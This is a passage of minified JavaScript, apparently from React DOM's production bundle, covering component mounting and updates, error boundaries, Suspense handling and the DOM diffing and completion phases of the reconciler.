    typeof s == "object" && s !== null ? o.context = qt(s) : (s = Pt(t) ? no : dt.current,
    o.context = as(e, s)),
    o.state = e.memoizedState,
    s = t.getDerivedStateFromProps,
    typeof s == "function" && (Gc(e, t, s, n),
    o.state = e.memoizedState),
    typeof t.getDerivedStateFromProps == "function" || typeof o.getSnapshotBeforeUpdate == "function" || typeof o.UNSAFE_componentWillMount != "function" && typeof o.componentWillMount != "function" || (t = o.state,
    typeof o.componentWillMount == "function" && o.componentWillMount(),
    typeof o.UNSAFE_componentWillMount == "function" && o.UNSAFE_componentWillMount(),
    t !== o.state && Xl.enqueueReplaceState(o, o.state, null),
    hl(e, n, o, r),
    o.state = e.memoizedState),
    typeof o.componentDidMount == "function" && (e.flags |= 4194308)
}
function ds(e, t) {
    try {
        var n = ""
          , r = t;
        do
            n += S1(r),
            r = r.return;
        while (r);
        var o = n
    } catch (s) {
        o = `
Error generating stack: ` + s.message + `
` + s.stack
    }
    return {
        value: e,
        source: t,
        stack: o,
        digest: null
    }
}
function Gu(e, t, n) {
    return {
        value: e,
        source: null,
        stack: n ?? null,
        digest: t ?? null
    }
}
function Xc(e, t) {
    try {
        console.error(t.value)
    } catch (n) {
        setTimeout(function() {
            throw n
        })
    }
}
var QS = typeof WeakMap == "function" ? WeakMap : Map;
function Cg(e, t, n) {
    n = Hn(-1, n),
    n.tag = 3,
    n.payload = {
        element: null
    };
    var r = t.value;
    return n.callback = function() {
        wl || (wl = !0,
        ld = r),
        Xc(e, t)
    }
    ,
    n
}
function kg(e, t, n) {
    n = Hn(-1, n),
    n.tag = 3;
    var r = e.type.getDerivedStateFromError;
    if (typeof r == "function") {
        var o = t.value;
        n.payload = function() {
            return r(o)
        }
        ,
        n.callback = function() {
            Xc(e, t)
        }
    }
    var s = e.stateNode;
    return s !== null && typeof s.componentDidCatch == "function" && (n.callback = function() {
        Xc(e, t),
        typeof r != "function" && (_r === null ? _r = new Set([this]) : _r.add(this));
        var i = t.stack;
        this.componentDidCatch(t.value, {
            componentStack: i !== null ? i : ""
        })
    }
    ),
    n
}
function ch(e, t, n) {
    var r = e.pingCache;
    if (r === null) {
        r = e.pingCache = new QS;
        var o = new Set;
        r.set(t, o)
    } else
        o = r.get(t),
        o === void 0 && (o = new Set,
        r.set(t, o));
    o.has(n) || (o.add(n),
    e = l_.bind(null, e, t, n),
    t.then(e, e))
}
function dh(e) {
    do {
        var t;
        if ((t = e.tag === 13) && (t = e.memoizedState,
        t = t !== null ? t.dehydrated !== null : !0),
        t)
            return e;
        e = e.return
    } while (e !== null);
    return null
}
function fh(e, t, n, r, o) {
    return e.mode & 1 ? (e.flags |= 65536,
    e.lanes = o,
    e) : (e === t ? e.flags |= 65536 : (e.flags |= 128,
    n.flags |= 131072,
    n.flags &= -52805,
    n.tag === 1 && (n.alternate === null ? n.tag = 17 : (t = Hn(-1, 1),
    t.tag = 2,
    Sr(n, t, 1))),
    n.lanes |= 1),
    e)
}
var qS = Xn.ReactCurrentOwner
  , kt = !1;
function mt(e, t, n, r) {
    t.child = e === null ? tg(t, null, n, r) : us(t, e.child, n, r)
}
function ph(e, t, n, r, o) {
    n = n.render;
    var s = t.ref;
    return Bo(t, o),
    r = vf(e, t, n, r, s, o),
    n = gf(),
    e !== null && !kt ? (t.updateQueue = e.updateQueue,
    t.flags &= -2053,
    e.lanes &= ~o,
    Qn(e, t, o)) : (Ae && n && rf(t),
    t.flags |= 1,
    mt(e, t, r, o),
    t.child)
}
function hh(e, t, n, r, o) {
    if (e === null) {
        var s = n.type;
        return typeof s == "function" && !Tf(s) && s.defaultProps === void 0 && n.compare === null && n.defaultProps === void 0 ? (t.tag = 15,
        t.type = s,
        Tg(e, t, s, r, o)) : (e = Wa(n.type, null, r, t, t.mode, o),
        e.ref = t.ref,
        e.return = t,
        t.child = e)
    }
    if (s = e.child,
    !(e.lanes & o)) {
        var i = s.memoizedProps;
        if (n = n.compare,
        n = n !== null ? n : hi,
        n(i, r) && e.ref === t.ref)
            return Qn(e, t, o)
    }
    return t.flags |= 1,
    e = br(s, r),
    e.ref = t.ref,
    e.return = t,
    t.child = e
}
function Tg(e, t, n, r, o) {
    if (e !== null) {
        var s = e.memoizedProps;
        if (hi(s, r) && e.ref === t.ref)
            if (kt = !1,
            t.pendingProps = r = s,
            (e.lanes & o) !== 0)
                e.flags & 131072 && (kt = !0);
            else
                return t.lanes = e.lanes,
                Qn(e, t, o)
    }
    return Jc(e, t, n, r, o)
}
function Pg(e, t, n) {
    var r = t.pendingProps
      , o = r.children
      , s = e !== null ? e.memoizedState : null;
    if (r.mode === "hidden")
        if (!(t.mode & 1))
            t.memoizedState = {
                baseLanes: 0,
                cachePool: null,
                transitions: null
            },
            Ce(Do, At),
            At |= n;
        else {
            if (!(n & 1073741824))
                return e = s !== null ? s.baseLanes | n : n,
                t.lanes = t.childLanes = 1073741824,
                t.memoizedState = {
                    baseLanes: e,
                    cachePool: null,
                    transitions: null
                },
                t.updateQueue = null,
                Ce(Do, At),
                At |= e,
                null;
            t.memoizedState = {
                baseLanes: 0,
                cachePool: null,
                transitions: null
            },
            r = s !== null ? s.baseLanes : n,
            Ce(Do, At),
            At |= r
        }
    else
        s !== null ? (r = s.baseLanes | n,
        t.memoizedState = null) : r = n,
        Ce(Do, At),
        At |= r;
    return mt(e, t, o, n),
    t.child
}
function Ng(e, t) {
    var n = t.ref;
    (e === null && n !== null || e !== null && e.ref !== n) && (t.flags |= 512,
    t.flags |= 2097152)
}
function Jc(e, t, n, r, o) {
    var s = Pt(n) ? no : dt.current;
    return s = as(t, s),
    Bo(t, o),
    n = vf(e, t, n, r, s, o),
    r = gf(),
    e !== null && !kt ? (t.updateQueue = e.updateQueue,
    t.flags &= -2053,
    e.lanes &= ~o,
    Qn(e, t, o)) : (Ae && r && rf(t),
    t.flags |= 1,
    mt(e, t, n, o),
    t.child)
}
function mh(e, t, n, r, o) {
    if (Pt(n)) {
        var s = !0;
        ul(t)
    } else
        s = !1;
    if (Bo(t, o),
    t.stateNode === null)
        Ua(e, t),
        bg(t, n, r),
        Yc(t, n, r, o),
        r = !0;
    else if (e === null) {
        var i = t.stateNode
          , a = t.memoizedProps;
        i.props = a;
        var l = i.context
          , u = n.contextType;
        typeof u == "object" && u !== null ? u = qt(u) : (u = Pt(n) ? no : dt.current,
        u = as(t, u));
        var c = n.getDerivedStateFromProps
          , d = typeof c == "function" || typeof i.getSnapshotBeforeUpdate == "function";
        d || typeof i.UNSAFE_componentWillReceiveProps != "function" && typeof i.componentWillReceiveProps != "function" || (a !== r || l !== u) && uh(t, i, r, u),
        sr = !1;
        var p = t.memoizedState;
        i.state = p,
        hl(t, r, i, o),
        l = t.memoizedState,
        a !== r || p !== l || Tt.current || sr ? (typeof c == "function" && (Gc(t, n, c, r),
        l = t.memoizedState),
        (a = sr || lh(t, n, a, r, p, l, u)) ? (d || typeof i.UNSAFE_componentWillMount != "function" && typeof i.componentWillMount != "function" || (typeof i.componentWillMount == "function" && i.componentWillMount(),
        typeof i.UNSAFE_componentWillMount == "function" && i.UNSAFE_componentWillMount()),
        typeof i.componentDidMount == "function" && (t.flags |= 4194308)) : (typeof i.componentDidMount == "function" && (t.flags |= 4194308),
        t.memoizedProps = r,
        t.memoizedState = l),
        i.props = r,
        i.state = l,
        i.context = u,
        r = a) : (typeof i.componentDidMount == "function" && (t.flags |= 4194308),
        r = !1)
    } else {
        i = t.stateNode,
        rg(e, t),
        a = t.memoizedProps,
        u = t.type === t.elementType ? a : Jt(t.type, a),
        i.props = u,
        d = t.pendingProps,
        p = i.context,
        l = n.contextType,
        typeof l == "object" && l !== null ? l = qt(l) : (l = Pt(n) ? no : dt.current,
        l = as(t, l));
        var w = n.getDerivedStateFromProps;
        (c = typeof w == "function" || typeof i.getSnapshotBeforeUpdate == "function") || typeof i.UNSAFE_componentWillReceiveProps != "function" && typeof i.componentWillReceiveProps != "function" || (a !== d || p !== l) && uh(t, i, r, l),
        sr = !1,
        p = t.memoizedState,
        i.state = p,
        hl(t, r, i, o);
        var x = t.memoizedState;
        a !== d || p !== x || Tt.current || sr ? (typeof w == "function" && (Gc(t, n, w, r),
        x = t.memoizedState),
        (u = sr || lh(t, n, u, r, p, x, l) || !1) ? (c || typeof i.UNSAFE_componentWillUpdate != "function" && typeof i.componentWillUpdate != "function" || (typeof i.componentWillUpdate == "function" && i.componentWillUpdate(r, x, l),
        typeof i.UNSAFE_componentWillUpdate == "function" && i.UNSAFE_componentWillUpdate(r, x, l)),
        typeof i.componentDidUpdate == "function" && (t.flags |= 4),
        typeof i.getSnapshotBeforeUpdate == "function" && (t.flags |= 1024)) : (typeof i.componentDidUpdate != "function" || a === e.memoizedProps && p === e.memoizedState || (t.flags |= 4),
        typeof i.getSnapshotBeforeUpdate != "function" || a === e.memoizedProps && p === e.memoizedState || (t.flags |= 1024),
        t.memoizedProps = r,
        t.memoizedState = x),
        i.props = r,
        i.state = x,
        i.context = l,
        r = u) : (typeof i.componentDidUpdate != "function" || a === e.memoizedProps && p === e.memoizedState || (t.flags |= 4),
        typeof i.getSnapshotBeforeUpdate != "function" || a === e.memoizedProps && p === e.memoizedState || (t.flags |= 1024),
        r = !1)
    }
    return ed(e, t, n, r, s, o)
}
function ed(e, t, n, r, o, s) {
    Ng(e, t);
    var i = (t.flags & 128) !== 0;
    if (!r && !i)
        return o && eh(t, n, !1),
        Qn(e, t, s);
    r = t.stateNode,
    qS.current = t;
    var a = i && typeof n.getDerivedStateFromError != "function" ? null : r.render();
    return t.flags |= 1,
    e !== null && i ? (t.child = us(t, e.child, null, s),
    t.child = us(t, null, a, s)) : mt(e, t, a, s),
    t.memoizedState = r.state,
    o && eh(t, n, !0),
    t.child
}
function Rg(e) {
    var t = e.stateNode;
    t.pendingContext ? Jp(e, t.pendingContext, t.pendingContext !== t.context) : t.context && Jp(e, t.context, !1),
    ff(e, t.containerInfo)
}
function vh(e, t, n, r, o) {
    return ls(),
    sf(o),
    t.flags |= 256,
    mt(e, t, n, r),
    t.child
}
var td = {
    dehydrated: null,
    treeContext: null,
    retryLane: 0
};
function nd(e) {
    return {
        baseLanes: e,
        cachePool: null,
        transitions: null
    }
}
function Ag(e, t, n) {
    var r = t.pendingProps, o = je.current, s = !1, i = (t.flags & 128) !== 0, a;
    if ((a = i) || (a = e !== null && e.memoizedState === null ? !1 : (o & 2) !== 0),
    a ? (s = !0,
    t.flags &= -129) : (e === null || e.memoizedState !== null) && (o |= 1),
    Ce(je, o & 1),
    e === null)
        return Qc(t),
        e = t.memoizedState,
        e !== null && (e = e.dehydrated,
        e !== null) ? (t.mode & 1 ? e.data === "$!" ? t.lanes = 8 : t.lanes = 1073741824 : t.lanes = 1,
        null) : (i = r.children,
        e = r.fallback,
        s ? (r = t.mode,
        s = t.child,
        i = {
            mode: "hidden",
            children: i
        },
        !(r & 1) && s !== null ? (s.childLanes = 0,
        s.pendingProps = i) : s = tu(i, r, 0, null),
        e = Jr(e, r, n, null),
        s.return = t,
        e.return = t,
        s.sibling = e,
        t.child = s,
        t.child.memoizedState = nd(n),
        t.memoizedState = td,
        e) : xf(t, i));
    if (o = e.memoizedState,
    o !== null && (a = o.dehydrated,
    a !== null))
        return GS(e, t, i, r, a, o, n);
    if (s) {
        s = r.fallback,
        i = t.mode,
        o = e.child,
        a = o.sibling;
        var l = {
            mode: "hidden",
            children: r.children
        };
        return !(i & 1) && t.child !== o ? (r = t.child,
        r.childLanes = 0,
        r.pendingProps = l,
        t.deletions = null) : (r = br(o, l),
        r.subtreeFlags = o.subtreeFlags & 14680064),
        a !== null ? s = br(a, s) : (s = Jr(s, i, n, null),
        s.flags |= 2),
        s.return = t,
        r.return = t,
        r.sibling = s,
        t.child = r,
        r = s,
        s = t.child,
        i = e.child.memoizedState,
        i = i === null ? nd(n) : {
            baseLanes: i.baseLanes | n,
            cachePool: null,
            transitions: i.transitions
        },
        s.memoizedState = i,
        s.childLanes = e.childLanes & ~n,
        t.memoizedState = td,
        r
    }
    return s = e.child,
    e = s.sibling,
    r = br(s, {
        mode: "visible",
        children: r.children
    }),
    !(t.mode & 1) && (r.lanes = n),
    r.return = t,
    r.sibling = null,
    e !== null && (n = t.deletions,
    n === null ? (t.deletions = [e],
    t.flags |= 16) : n.push(e)),
    t.child = r,
    t.memoizedState = null,
    r
}
function xf(e, t) {
    return t = tu({
        mode: "visible",
        children: t
    }, e.mode, 0, null),
    t.return = e,
    e.child = t
}
function _a(e, t, n, r) {
    return r !== null && sf(r),
    us(t, e.child, null, n),
    e = xf(t, t.pendingProps.children),
    e.flags |= 2,
    t.memoizedState = null,
    e
}
function GS(e, t, n, r, o, s, i) {
    if (n)
        return t.flags & 256 ? (t.flags &= -257,
        r = Gu(Error(M(422))),
        _a(e, t, i, r)) : t.memoizedState !== null ? (t.child = e.child,
        t.flags |= 128,
        null) : (s = r.fallback,
        o = t.mode,
        r = tu({
            mode: "visible",
            children: r.children
        }, o, 0, null),
        s = Jr(s, o, i, null),
        s.flags |= 2,
        r.return = t,
        s.return = t,
        r.sibling = s,
        t.child = r,
        t.mode & 1 && us(t, e.child, null, i),
        t.child.memoizedState = nd(i),
        t.memoizedState = td,
        s);
    if (!(t.mode & 1))
        return _a(e, t, i, null);
    if (o.data === "$!") {
        if (r = o.nextSibling && o.nextSibling.dataset,
        r)
            var a = r.dgst;
        return r = a,
        s = Error(M(419)),
        r = Gu(s, r, void 0),
        _a(e, t, i, r)
    }
    if (a = (i & e.childLanes) !== 0,
    kt || a) {
        if (r = Je,
        r !== null) {
            switch (i & -i) {
            case 4:
                o = 2;
                break;
            case 16:
                o = 8;
                break;
            case 64:
            case 128:
            case 256:
            case 512:
            case 1024:
            case 2048:
            case 4096:
            case 8192:
            case 16384:
            case 32768:
            case 65536:
            case 131072:
            case 262144:
            case 524288:
            case 1048576:
            case 2097152:
            case 4194304:
            case 8388608:
            case 16777216:
            case 33554432:
            case 67108864:
                o = 32;
                break;
            case 536870912:
                o = 268435456;
                break;
            default:
                o = 0
            }
            o = o & (r.suspendedLanes | i) ? 0 : o,
            o !== 0 && o !== s.retryLane && (s.retryLane = o,
            Kn(e, o),
            cn(r, e, o, -1))
        }
        return kf(),
        r = Gu(Error(M(421))),
        _a(e, t, i, r)
    }
    return o.data === "$?" ? (t.flags |= 128,
    t.child = e.child,
    t = u_.bind(null, e),
    o._reactRetry = t,
    null) : (e = s.treeContext,
    jt = xr(o.nextSibling),
    Mt = t,
    Ae = !0,
    on = null,
    e !== null && (Wt[Zt++] = $n,
    Wt[Zt++] = Un,
    Wt[Zt++] = ro,
    $n = e.id,
    Un = e.overflow,
    ro = t),
    t = xf(t, r.children),
    t.flags |= 4096,
    t)
}
function gh(e, t, n) {
    e.lanes |= t;
    var r = e.alternate;
    r !== null && (r.lanes |= t),
    qc(e.return, t, n)
}
function Yu(e, t, n, r, o) {
    var s = e.memoizedState;
    s === null ? e.memoizedState = {
        isBackwards: t,
        rendering: null,
        renderingStartTime: 0,
        last: r,
        tail: n,
        tailMode: o
    } : (s.isBackwards = t,
    s.rendering = null,
    s.renderingStartTime = 0,
    s.last = r,
    s.tail = n,
    s.tailMode = o)
}
function Og(e, t, n) {
    var r = t.pendingProps
      , o = r.revealOrder
      , s = r.tail;
    if (mt(e, t, r.children, n),
    r = je.current,
    r & 2)
        r = r & 1 | 2,
        t.flags |= 128;
    else {
        if (e !== null && e.flags & 128)
            e: for (e = t.child; e !== null; ) {
                if (e.tag === 13)
                    e.memoizedState !== null && gh(e, n, t);
                else if (e.tag === 19)
                    gh(e, n, t);
                else if (e.child !== null) {
                    e.child.return = e,
                    e = e.child;
                    continue
                }
                if (e === t)
                    break e;
                for (; e.sibling === null; ) {
                    if (e.return === null || e.return === t)
                        break e;
                    e = e.return
                }
                e.sibling.return = e.return,
                e = e.sibling
            }
        r &= 1
    }
    if (Ce(je, r),
    !(t.mode & 1))
        t.memoizedState = null;
    else
        switch (o) {
        case "forwards":
            for (n = t.child,
            o = null; n !== null; )
                e = n.alternate,
                e !== null && ml(e) === null && (o = n),
                n = n.sibling;
            n = o,
            n === null ? (o = t.child,
            t.child = null) : (o = n.sibling,
            n.sibling = null),
            Yu(t, !1, o, n, s);
            break;
        case "backwards":
            for (n = null,
            o = t.child,
            t.child = null; o !== null; ) {
                if (e = o.alternate,
                e !== null && ml(e) === null) {
                    t.child = o;
                    break
                }
                e = o.sibling,
                o.sibling = n,
                n = o,
                o = e
            }
            Yu(t, !0, n, null, s);
            break;
        case "together":
            Yu(t, !1, null, null, void 0);
            break;
        default:
            t.memoizedState = null
        }
    return t.child
}
function Ua(e, t) {
    !(t.mode & 1) && e !== null && (e.alternate = null,
    t.alternate = null,
    t.flags |= 2)
}
function Qn(e, t, n) {
    if (e !== null && (t.dependencies = e.dependencies),
    so |= t.lanes,
    !(n & t.childLanes))
        return null;
    if (e !== null && t.child !== e.child)
        throw Error(M(153));
    if (t.child !== null) {
        for (e = t.child,
        n = br(e, e.pendingProps),
        t.child = n,
        n.return = t; e.sibling !== null; )
            e = e.sibling,
            n = n.sibling = br(e, e.pendingProps),
            n.return = t;
        n.sibling = null
    }
    return t.child
}
function YS(e, t, n) {
    switch (t.tag) {
    case 3:
        Rg(t),
        ls();
        break;
    case 5:
        og(t);
        break;
    case 1:
        Pt(t.type) && ul(t);
        break;
    case 4:
        ff(t, t.stateNode.containerInfo);
        break;
    case 10:
        var r = t.type._context
          , o = t.memoizedProps.value;
        Ce(fl, r._currentValue),
        r._currentValue = o;
        break;
    case 13:
        if (r = t.memoizedState,
        r !== null)
            return r.dehydrated !== null ? (Ce(je, je.current & 1),
            t.flags |= 128,
            null) : n & t.child.childLanes ? Ag(e, t, n) : (Ce(je, je.current & 1),
            e = Qn(e, t, n),
            e !== null ? e.sibling : null);
        Ce(je, je.current & 1);
        break;
    case 19:
        if (r = (n & t.childLanes) !== 0,
        e.flags & 128) {
            if (r)
                return Og(e, t, n);
            t.flags |= 128
        }
        if (o = t.memoizedState,
        o !== null && (o.rendering = null,
        o.tail = null,
        o.lastEffect = null),
        Ce(je, je.current),
        r)
            break;
        return null;
    case 22:
    case 23:
        return t.lanes = 0,
        Pg(e, t, n)
    }
    return Qn(e, t, n)
}
var jg, rd, Mg, Ig;
jg = function(e, t) {
    for (var n = t.child; n !== null; ) {
        if (n.tag === 5 || n.tag === 6)
            e.appendChild(n.stateNode);
        else if (n.tag !== 4 && n.child !== null) {
            n.child.return = n,
            n = n.child;
            continue
        }
        if (n === t)
            break;
        for (; n.sibling === null; ) {
            if (n.return === null || n.return === t)
                return;
            n = n.return
        }
        n.sibling.return = n.return,
        n = n.sibling
    }
}
;
rd = function() {}
;
Mg = function(e, t, n, r) {
    var o = e.memoizedProps;
    if (o !== r) {
        e = t.stateNode,
        Wr(kn.current);
        var s = null;
        switch (n) {
        case "input":
            o = Cc(e, o),
            r = Cc(e, r),
            s = [];
            break;
        case "select":
            o = Ie({}, o, {
                value: void 0
            }),
            r = Ie({}, r, {
                value: void 0
            }),
            s = [];
            break;
        case "textarea":
            o = Pc(e, o),
            r = Pc(e, r),
            s = [];
            break;
        default:
            typeof o.onClick != "function" && typeof r.onClick == "function" && (e.onclick = al)
        }
        Rc(n, r);
        var i;
        n = null;
        for (u in o)
            if (!r.hasOwnProperty(u) && o.hasOwnProperty(u) && o[u] != null)
                if (u === "style") {
                    var a = o[u];
                    for (i in a)
                        a.hasOwnProperty(i) && (n || (n = {}),
                        n[i] = "")
                } else
                    u !== "dangerouslySetInnerHTML" && u !== "children" && u !== "suppressContentEditableWarning" && u !== "suppressHydrationWarning" && u !== "autoFocus" && (ai.hasOwnProperty(u) ? s || (s = []) : (s = s || []).push(u, null));
        for (u in r) {
            var l = r[u];
            if (a = o != null ? o[u] : void 0,
            r.hasOwnProperty(u) && l !== a && (l != null || a != null))
                if (u === "style")
                    if (a) {
                        for (i in a)
                            !a.hasOwnProperty(i) || l && l.hasOwnProperty(i) || (n || (n = {}),
                            n[i] = "");
                        for (i in l)
                            l.hasOwnProperty(i) && a[i] !== l[i] && (n || (n = {}),
                            n[i] = l[i])
                    } else
                        n || (s || (s = []),
                        s.push(u, n)),
                        n = l;
                else
                    u === "dangerouslySetInnerHTML" ? (l = l ? l.__html : void 0,
                    a = a ? a.__html : void 0,
                    l != null && a !== l && (s = s || []).push(u, l)) : u === "children" ? typeof l != "string" && typeof l != "number" || (s = s || []).push(u, "" + l) : u !== "suppressContentEditableWarning" && u !== "suppressHydrationWarning" && (ai.hasOwnProperty(u) ? (l != null && u === "onScroll" && Te("scroll", e),
                    s || a === l || (s = [])) : (s = s || []).push(u, l))
        }
        n && (s = s || []).push("style", n);
        var u = s;
        (t.updateQueue = u) && (t.flags |= 4)
    }
}
;
Ig = function(e, t, n, r) {
    n !== r && (t.flags |= 4)
}
;
function js(e, t) {
    if (!Ae)
        switch (e.tailMode) {
        case "hidden":
            t = e.tail;
            for (var n = null; t !== null; )
                t.alternate !== null && (n = t),
                t = t.sibling;
            n === null ? e.tail = null : n.sibling = null;
            break;
        case "collapsed":
            n = e.tail;
            for (var r = null; n !== null; )
                n.alternate !== null && (r = n),
                n = n.sibling;
            r === null ? t || e.tail === null ? e.tail = null : e.tail.sibling = null : r.sibling = null
        }
}
function lt(e) {
    var t = e.alternate !== null && e.alternate.child === e.child
      , n = 0
      , r = 0;
    if (t)
        for (var o = e.child; o !== null; )
            n |= o.lanes | o.childLanes,
            r |= o.subtreeFlags & 14680064,
            r |= o.flags & 14680064,
            o.return = e,
            o = o.sibling;
    else
        for (o = e.child; o !== null; )
            n |= o.lanes | o.childLanes,
            r |= o.subtreeFlags,
            r |= o.flags,
            o.return = e,
            o = o.sibling;
    return e.subtreeFlags |= r,
    e.childLanes = n,
    t
}
function XS(e, t, n) {
    var r = t.pendingProps;
    switch (of(t),
    t.tag) {
    case 2:
    case 16:
    case 15:
    case 0:
    case 11:
    case 7:
    case 8:
    case 12:
    case 9:
    case 14:
        return lt(t),
        null;
    case 1:
        return Pt(t.type) && ll(),
        lt(t),
        null;
    case 3:
        return r = t.stateNode,
        cs(),
        Pe(Tt),
        Pe(dt),
        hf(),
        r.pendingContext && (r.context = r.pendingContext,
        r.pendingContext = null),
        (e === null || e.child === null) && (xa(t) ? t.flags |= 4 : e === null || e.memoizedState.isDehydrated && !(t.flags & 256) || (t.flags |= 1024,
        on !== null && (dd(on),
        on = null))),
        rd(e, t),
        lt(t),
        null;
    case 5:
        pf(t);
        var o = Wr(wi.current);
        if (n = t.type,
        e !== null && t.stateNode != null)
            Mg(e, t, n, r, o),
            e.ref !== t.ref && (t.flags |= 512,
            t.flags |= 2097152);
        else {
            if (!r) {
                if (t.stateNode === null)
                    throw Error(M(166));
                return lt(t),
                null
            }
            if (e = Wr(kn.current),
            xa(t)) {
                r = t.stateNode,
                n = t.type;
                var s = t.memoizedProps;
                switch (r[_n] = t,
                r[gi] = s,
                e = (t.mode & 1) !== 0,
                n) {
                case "dialog":
                    Te("cancel", r),
                    Te("close", r);
                    break;
                case "iframe":
                case "object":
                case "embed":
                    Te("load", r);
                    break;
                case "video":
                case "audio":
                    for (o = 0; o < Ws.length; o++)
                        Te(Ws[o], r);
                    break;
                case "source":
                    Te("error", r);
                    break;
                case "img":
                case "image":
                case "link":
                    Te("error", r),
                    Te("load", r);
                    break;
                case "details":
                    Te("toggle", r);
                    break;
                case "input":
                    kp(r, s),
                    Te("invalid", r);
                    break;
                case "select":
                    r._wrapperState = {
                        wasMultiple: !!s.multiple
                    },
                    Te("invalid", r);
                    break;
                case "textarea":
                    Pp(r, s),
                    Te("invalid", r)
                }
                Rc(n, s),
                o = null;
                for (var i in s)
                    if (s.hasOwnProperty(i)) {
                        var a = s[i];
                        i === "children" ? typeof a == "string" ? r.textContent !== a && (s.suppressHydrationWarning !== !0 && wa(r.textContent, a, e),
                        o = ["children", a]) : typeof a == "number" && r.textContent !== "" + a && (s.suppressHydrationWarning !== !0 && wa(r.textContent, a, e),
                        o = ["children", "" + a]) : ai.hasOwnProperty(i) && a != null && i === "onScroll" && Te("scroll", r)
                    }
                switch (n) {
                case "input":
                    da(r),
                    Tp(r, s, !0);
                    break;
                case "textarea":
                    da(r),
                    Np(r);
                    break;
                case "select":
                case "option":
                    break;
                default:
                    typeof s.onClick == "function" && (r.onclick = al)
                }
                r = o,
                t.updateQueue = r,
                r !== null && (t.flags |= 4)
            } else {
                i = o.nodeType === 9 ? o : o.ownerDocument,
                e === "http://www.w3.org/1999/xhtml" && (e = uv(n)),
                e === "http://www.w3.org/1999/xhtml" ? n === "script" ? (e = i.createElement("div"),
                e.innerHTML = "<script><\/script>",
                e = e.removeChild(e.firstChild)) : typeof r.is == "string" ? e = i.createElement(n, {
                    is: r.is
                }) : (e = i.createElement(n),
                n === "select" && (i = e,
                r.multiple ? i.multiple = !0 : r.size && (i.size = r.size))) : e = i.createElementNS(e, n),
                e[_n] = t,
                e[gi] = r,
                jg(e, t, !1, !1),
                t.stateNode = e;
                e: {
                    switch (i = Ac(n, r),
                    n) {
                    case "dialog":
                        Te("cancel", e),
                        Te("close", e),
                        o = r;
                        break;
                    case "iframe":
                    case "object":
                    case "embed":
                        Te("load", e),
                        o = r;
                        break;
                    case "video":
                    case "audio":
                        for (o = 0; o < Ws.length; o++)
                            Te(Ws[o], e);
                        o = r;
                        break;
                    case "source":
                        Te("error", e),
                        o = r;
                        break;
                    case "img":
                    case "image":
                    case "link":
                        Te("error", e),
                        Te("load", e),
                        o = r;
                        break;
                    case "details":
                        Te("toggle", e),
                        o = r;
                        break;
                    case "input":
                        kp(e, r),
                        o = Cc(e, r),
                        Te("invalid", e);
                        break;
                    case "option":
                        o = r;
                        break;
                    case "select":
                        e._wrapperState = {
                            wasMultiple: !!r.multiple
                        },
                        o = Ie({}, r, {
                            value: void 0
                        }),
                        Te("invalid", e);
                        break;
                    case "textarea":
                        Pp(e, r),
                        o = Pc(e, r),
                        Te("invalid", e);
                        break;
                    default:
                        o = r
                    }
                    Rc(n, o),
                    a = o;
                    for (s in a)
                        if (a.hasOwnProperty(s)) {
                            var l = a[s];
                            s === "style" ? fv(e, l) : s === "dangerouslySetInnerHTML" ? (l = l ? l.__html : void 0,
                            l != null && cv(e, l)) : s === "children" ? typeof l == "string" ? (n !== "textarea" || l !== "") && li(e, l) : typeof l == "number" && li(e, "" + l) : s !== "suppressContentEditableWarning" && s !== "suppressHydrationWarning" && s !== "autoFocus" && (ai.hasOwnProperty(s) ? l != null && s === "onScroll" && Te("scroll", e) : l != null && Bd(e, s, l, i))
                        }
                    switch (n) {
                    case "input":
                        da(e),
                        Tp(e, r, !1);
                        break;
                    case "textarea":
                        da(e),
                        Np(e);
                        break;
                    case "option":
                        r.value != null && e.setAttribute("value", "" + Cr(r.value));
                        break;
                    case "select":
                        e.multiple = !!r.multiple,
                        s = r.value,
                        s != null ? Vo(e, !!r.multiple, s, !1) : r.defaultValue != null && Vo(e, !!r.multiple, r.defaultValue, !0);
                        break;
                    default:
                        typeof o.onClick == "function" && (e.onclick = al)
                    }
                    switch (n) {
                    case "button":
                    case "input":
                    case "select":
                    case "textarea":
                        r = !!r.autoFocus;
                        break e;
                    case "img":
                        r = !0;
                        break e;
                    default:
                        r = !1
                    }
                }
                r && (t.flags |= 4)
            }
            t.ref !== null && (t.flags |= 512,
            t.flags |= 2097152)
        }
        return lt(t),
        null;
    case 6:
        if (e && t.stateNode != null)
            Ig(e, t, e.memoizedProps, r);
        else {
            if (typeof r != "string" && t.stateNode === null)
                throw Error(M(166));
            if (n = Wr(wi.current),
            Wr(kn.current),
            xa(t)) {
                if (r = t.stateNode,
                n = t.memoizedProps,
                r[_n] = t,
                (s = r.nodeValue !== n) && (e = Mt,
                e !== null))
                    switch (e.tag) {
                    case 3:
                        wa(r.nodeValue, n, (e.mode & 1) !== 0);
                        break;
                    case 5:
                        e.memoizedProps.suppressHydrationWarning !== !0 && wa(r.nodeValue, n, (e.mode & 1) !== 0)
                    }
                s && (t.flags |= 4)
            } else
                r = (n.nodeType === 9 ? n : n.ownerDocument).createTextNode(r),
                r[_n] = t,
                t.stateNode = r
        }
        return lt(t),
        null;
    case 13:
        if (Pe(je),
        r = t.memoizedState,
        e === null || e.memoizedState !== null && e.memoizedState.dehydrated !== null) {
            if (Ae && jt !== null && t.mode & 1 && !(t.flags & 128))
                Jv(),
                ls(),
                t.flags |= 98560,
                s = !1;
            else if (s = xa(t),
            r !== null && r.dehydrated !== null) {
                if (e === null) {
                    if (!s)
                        throw Error(M(318));
                    if (s = t.memoizedState,
                    s = s !== null ? s.dehydrated : null,
                    !s)
                        throw Error(M(317));
                    s[_n] = t
                } else
                    ls(),
                    !(t.flags & 128) && (t.memoizedState = null),
                    t.flags |= 4;
                lt(t),
                s = !1
            } else
                on !== null && (dd(on),
                on = null),
                s = !0;
            if (!s)
                return t.flags & 65536 ? t : null
        }
        return t.flags & 128 ? (t.lanes = n,
        t) : (r = r !== null,
        r !== (e !== null && e.memoizedState !== null) && r && (t.child.flags |= 8192,
        t.mode & 1 && (e === null || je.current & 1 ? qe === 0 && (qe = 3) : kf())),
        t.updateQueue !== null && (t.flags |= 4),
        lt(t),
        null);
    case 4:
        return cs(),
        rd(e, t),
        e === null && mi(t.stateNode.containerInfo),
        lt(t),
        null;
    case 10:
        return uf(t.type._context),
        lt(t),
        null;
    case 17:
        return Pt(t.type) && ll(),
        lt(t),
        null;
    case 19:
        if (Pe(je),
        s = t.memoizedState,
        s === null)
            return lt(t),
            null;
        if (r = (t.flags & 128) !== 0,
        i = s.rendering,
        i === null)
            if (r)
                js(s, !1);
            else {
                if (qe !== 0 || e !== null && e.flags & 128)
                    for (e = t.child; e !== null; ) {
                        if (i = ml(e),
